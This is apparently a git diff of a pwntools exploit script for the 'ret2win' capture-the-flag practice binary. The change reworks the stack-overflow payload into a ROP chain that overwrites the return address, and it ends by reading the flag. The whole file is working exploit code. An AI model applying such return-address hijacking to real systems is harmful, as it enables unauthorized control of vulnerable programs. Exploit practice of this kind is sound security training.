@@ -1,6 +1,7 @@
 from pwn import *
 
 elf = ELF("ret2win")
+rop = ROP(elf)
 
 context.binary = elf
 context.terminal = ['konsole', '-e']
@@ -8,7 +9,7 @@ context.log_level = logging.INFO
 
 gdbscript = '''
 set follow-fork-mode parent
-break *ret2win
+break *pwnme+0x6d
 continue
 '''
 
@@ -20,12 +21,16 @@ def connection():
     return c
 
 BUFFER_SIZE = 32
+READ_SIZE = 56
 
 def main():
-    payload = flat({BUFFER_SIZE + context.bytes: elf.symbols.ret2win + 0xe})
+    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
+    rop.raw(elf.symbols.ret2win + 0xe)
+    payload = rop.chain()
+    assert len(payload) <= READ_SIZE
 
     c = connection()
-    c.sendlineafter(b'> ', payload)
+    c.sendafter(b'> ', payload)
     print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())
 
 if __name__ == '__main__':
